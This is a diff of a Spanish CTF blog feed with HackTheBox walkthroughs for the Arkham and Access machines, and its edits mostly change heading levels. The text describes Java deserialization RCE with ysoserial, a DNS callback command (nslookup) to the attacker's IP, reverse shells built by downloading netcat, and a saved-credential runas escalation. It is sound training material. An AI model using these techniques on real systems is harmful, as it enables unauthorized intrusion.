@@ -43,7 +43,7 @@
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -74,7 +74,7 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;masscan-&#34;&gt;MASSCAN&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap-&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -106,8 +106,7 @@ Discovered open port 8080/tcp on 10.10.10.130
 Discovered open port 49667/tcp on 10.10.10.130
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
-&lt;p&gt;Escaneo de servicios en puertos anteriormente encontrados.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Escaneo de servicios en puertos anteriormente encontrados.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -146,7 +145,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 68.49 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;smb-&#34;&gt;SMB&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;smb-&#34;&gt;SMB&lt;/h1&gt;
 &lt;p&gt;Buscamos los sharenames a los que tengamos acceso.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -408,7 +407,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http---8080-&#34;&gt;HTTP - 8080&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http---8080-&#34;&gt;HTTP - 8080&lt;/h1&gt;
 &lt;p&gt;Puerto 8080 en http.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-03-25%2017-47-40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
@@ -424,7 +423,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.07.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;viewstate-&#34;&gt;ViewState&lt;/h2&gt;
 &lt;p&gt;JSF utiliza viewStates para almacenar los datos de la vista, pueden ser &amp;lsquo;almacenados&amp;rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de &lt;code&gt;javax.faces.ViewState&lt;/code&gt;, como es el caso de la pagina que encontramos.&lt;/p&gt;
-&lt;h3 id=&#34;java-deserialization-&#34;&gt;Java Deserialization&lt;/h3&gt;
+&lt;h1 id=&#34;java-deserialization-&#34;&gt;Java Deserialization&lt;/h1&gt;
 &lt;p&gt;Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.&lt;/p&gt;
 &lt;p&gt;Al intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encoriptado.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.16.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -575,9 +574,13 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;/div&gt;&lt;p&gt;&lt;em&gt;Funciona tambien con la version ysoserial.jar, pero se tienen comandos &amp;lsquo;limitados&amp;rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;Ya que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: &lt;code&gt;nslookup CommonsCollections1 10.10.1X.1X&lt;/code&gt;) y el payload que funcione nos aparecerá en nuestra terminal (Utilizamos &lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;&lt;strong&gt;responder&lt;/strong&gt;&lt;/a&gt;).&lt;/p&gt;
 &lt;p&gt;Aqui se encuentra el codigo:&lt;/p&gt;
-&lt;h4 id=&#34;codigo-java---githubhttpsgithubcomsckullctf-stufftreemasterarkham-&#34;&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/tree/master/arkham&#34;&gt;&lt;strong&gt;Codigo Java - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/tree/master/arkham&#34;&gt;&lt;strong&gt;Codigo Java - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;p&gt;De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.&lt;/p&gt;
-&lt;h4 id=&#34;codigo-python---githubhttpsgithubcomsckullctf-stuffblobmasterarkhamdeserialization-javapy-&#34;&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/arkham/deserialization-java.py&#34;&gt;&lt;strong&gt;Codigo Python - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/arkham/deserialization-java.py&#34;&gt;&lt;strong&gt;Codigo Python - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h2 id=&#34;rce---request-dns-&#34;&gt;RCE - Request DNS&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2017-49.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son &lt;code&gt;CommonsCollections5, CommonsCollections6&lt;/code&gt;, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.&lt;/p&gt;
@@ -601,7 +604,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.15.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;reverse-shell---alfred-&#34;&gt;REVERSE SHELL - Alfred&lt;/h2&gt;
+&lt;h1 id=&#34;reverse-shell---alfred-&#34;&gt;REVERSE SHELL - Alfred&lt;/h1&gt;
 &lt;p&gt;Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) y ejecutar una shell inversa.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Comando&lt;/strong&gt;: Cambiamos el primer parametro de cmand a &amp;ldquo;powershell&amp;rdquo;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -620,7 +623,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.57.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Vemos que Batman pertenece al grupo de Administrators.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.01.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user---batman-&#34;&gt;USER - BATMAN&lt;/h2&gt;
+&lt;h1 id=&#34;user---batman-&#34;&gt;USER - BATMAN&lt;/h1&gt;
 &lt;p&gt;En el directorio &lt;code&gt;C:\Users\alfred\Downloads\backups&lt;/code&gt; encontramos un archivo &lt;code&gt;backup.zip&lt;/code&gt;, lo trasladamos a nuestra maquina con &lt;a href=&#34;https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/&#34;&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.37.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Al descomprimirlo nos muestra un archivo &lt;code&gt;.ost&lt;/code&gt; de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (&lt;code&gt;Drafts.mbox&lt;/code&gt;).&lt;/p&gt;
@@ -657,7 +660,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2019-03.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.05.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;reverse-shell---batman-&#34;&gt;REVERSE SHELL - BATMAN&lt;/h2&gt;
+&lt;h1 id=&#34;reverse-shell---batman-&#34;&gt;REVERSE SHELL - BATMAN&lt;/h1&gt;
 &lt;p&gt;Para obtener una shell inversa con el usuario Batman vamos a utilizar &lt;code&gt;Invoke-Command&lt;/code&gt; para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -757,7 +760,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;br&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;Access es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap-&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Utilizando la herramienta nmap para escaneo de puertos y servicios.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -872,7 +875,7 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;hr /&gt;
-&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_204827.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Se utilizo la herramienta gobuster para realizar una busqueda de archivos, directorios, etc. dentro del sitio web.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -915,7 +918,7 @@ Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;No encontramos mucho para poder explorar mas que solo el index.html.&lt;/p&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
 &lt;p&gt;Iniciamos sesion en el servicio FTP con el usuario y contraseña &amp;lsquo;anonymous&amp;rsquo;. Dentro de este encontramos dos carpetas y dos archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1015,7 +1018,7 @@ root@sckull:~/htb/access# ls
 &lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.zip&amp;#39;&lt;/span&gt;   backup.mdb
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Ahora tenemos dos archivos &amp;lsquo;Access Control.zip&amp;rsquo; y &amp;lsquo;backup.mdb&amp;rsquo;.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Ahora tenemos dos archivos &amp;lsquo;Access Control.zip&amp;rsquo; y &amp;lsquo;mdb&amp;rsquo;.&lt;/p&gt;
 &lt;p&gt;Analizando los archivos de que obtuvimos en FTP, encontramos que backup.mdb es un archivo de Microsoft Access Database y Access Control.zip al intentar descomprimir los archivos dentro, nos pide una contraseña.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1047,9 +1050,10 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 &lt;span class=&#34;m&#34;&gt;10848&lt;/span&gt;         0x2A60          End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;En el primer archivo utilizamos la pagina &amp;lsquo;&lt;a href=&#34;https://www.mdbopener.com/&#39;&#34;&gt;https://www.mdbopener.com/&#39;&lt;/a&gt; para realizar alguna busqueda de datos que nos pudiesen ayudar de alguna forma en algun otro servicio y encontramos una base de datos de lo que parece ser de una empresa, nos centramos en datos de usuarios y contraseñas y econtramos una tabla que se hace llamar &amp;lsquo;auth_user&amp;rsquo; con los siguientes datos:&lt;/p&gt;
+&lt;/div&gt;&lt;h1 id=&#34;mdb&#34;&gt;mdb&lt;/h1&gt;
+&lt;p&gt;En el primer archivo utilizamos la pagina &amp;lsquo;&lt;a href=&#34;https://www.mdbopener.com/&#39;&#34;&gt;https://www.mdbopener.com/&#39;&lt;/a&gt; para realizar alguna busqueda de datos que nos pudiesen ayudar de alguna forma en algun otro servicio y encontramos una base de datos de lo que parece ser de una empresa, nos centramos en datos de usuarios y contraseñas y econtramos una tabla que se hace llamar &amp;lsquo;auth_user&amp;rsquo; con los siguientes datos:&lt;/p&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;tablas&#34;&gt;TABLAS&lt;/h2&gt;
+&lt;h3 id=&#34;tablas&#34;&gt;TABLAS&lt;/h3&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_211423.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h3 id=&#34;auth_user&#34;&gt;auth_user&lt;/h3&gt;
@@ -1172,7 +1176,7 @@ John
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;hr /&gt;
-&lt;h2 id=&#34;telnet---obteniendo-acceso&#34;&gt;Telnet - Obteniendo Acceso&lt;/h2&gt;
+&lt;h1 id=&#34;telnet---obteniendo-acceso&#34;&gt;Telnet - Obteniendo Acceso&lt;/h1&gt;
 &lt;p&gt;Como pudimos observar el archivo &amp;lsquo;Access Control.mbox&amp;rsquo; es un archivo que contiene un email, dentro de el John nos indica que la contraseña para el usuario &amp;lsquo;security&amp;rsquo; fue cambiada a &amp;lsquo;4Cc3ssC0ntr0ller&amp;rsquo;. Aprovechando estos datos procedemos a utilizar el servicio telnet para conectarnos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1244,7 +1248,7 @@ C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Y asi obtenemos nuestra primera bandera &amp;lsquo;user.txt&amp;rsquo;.&lt;/p&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
 &lt;p&gt;Enumerando archivos y directorios no encontramos nada, pero al utilizar el comando &amp;lsquo;cmdkey /list&amp;rsquo; encontramos que el usuario Administrator tiene una contraseña guardada.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1274,17 +1278,17 @@ C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Utilizando &amp;lsquo;runas&amp;rsquo; para ejecutar comandos con el usuario Administrator y con la contraseña guardada en la maquina. Primero generamos nuestro payload con msfvenom y ponemos a la escucha nuestro exploit.&lt;/p&gt;
 &lt;p&gt;RUNAS =&amp;gt; &lt;a href=&#34;https://ss64.com/nt/runas.html&#34;&gt;https://ss64.com/nt/runas.html&lt;/a&gt;&lt;/p&gt;
-&lt;h4 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h4&gt;
+&lt;h2 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213222.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;msfvenom&#34;&gt;Msfvenom&lt;/h4&gt;
+&lt;h2 id=&#34;msfvenom&#34;&gt;Msfvenom&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213546.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Teniendo nuestro entorno local listo, procedemos a descargar nuestro payload a la maquina y ejecutarlo con &amp;lsquo;runas&amp;rsquo;.&lt;/p&gt;
-&lt;h4 id=&#34;cmd&#34;&gt;CMD&lt;/h4&gt;
+&lt;h2 id=&#34;cmd&#34;&gt;CMD&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213721.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;python-http-server&#34;&gt;Python HTTP Server&lt;/h4&gt;
+&lt;h2 id=&#34;python-http-server&#34;&gt;Python HTTP Server&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213738.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;En nuestro entorno local obtenemos una sesion y con el privilegios de administracion.&lt;/p&gt;
-&lt;h4 id=&#34;metasploit---sesion&#34;&gt;Metasploit - Sesion&lt;/h4&gt;
+&lt;h2 id=&#34;metasploit---sesion&#34;&gt;Metasploit - Sesion&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213835.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 </content:encoded>
         <dc:creator>sckull</dc:creator>
